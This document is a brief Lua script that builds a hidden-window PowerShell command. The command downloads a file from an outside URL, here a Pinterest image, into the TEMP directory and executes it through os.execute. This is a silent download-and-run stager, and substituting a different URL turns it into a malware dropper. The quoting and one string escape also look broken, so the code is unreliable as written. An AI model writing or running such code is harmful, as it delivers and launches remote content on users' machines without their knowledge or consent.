local ps = 'powershell -WindowStyle Hidden -Command "'
local url = 'https://i.pinimg.com/736x/a6/f2/c1/a6f2c1195e90542a97bf7b329390001a.jpg'
local out = os.getenv('TEMP') .. '\image.jpg'
ps = ps .. '$c=New-Object Net.WebClient;$c.DownloadFile(''..url..'',''..out..'');Start-Process ''..out..''"'
loadstring('os.execute(''..ps..'')')()
